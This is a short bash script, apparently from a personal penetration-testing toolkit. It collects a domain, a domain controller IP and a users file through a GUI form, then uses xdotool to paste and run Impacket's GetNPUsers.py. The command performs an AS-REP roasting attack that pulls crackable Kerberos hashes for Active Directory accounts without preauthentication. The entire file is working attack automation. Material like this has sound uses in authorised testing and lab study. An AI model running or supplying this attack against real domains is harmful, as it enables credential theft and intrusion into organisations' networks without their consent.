#!/bin/bash

: '
do an asreproast attack
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Domain" "DC IP" "Users file"

DOMAIN=${form_data["Domain"]}
DC_IP=${form_data["DC IP"]}
USERS_FILE=${form_data["Users file"]}

paste_command "GetNPUsers.py ${DOMAIN}/ -dc-ip ${DC_IP} -no-pass -usersfile ${USERS_FILE}"
xdotool key Return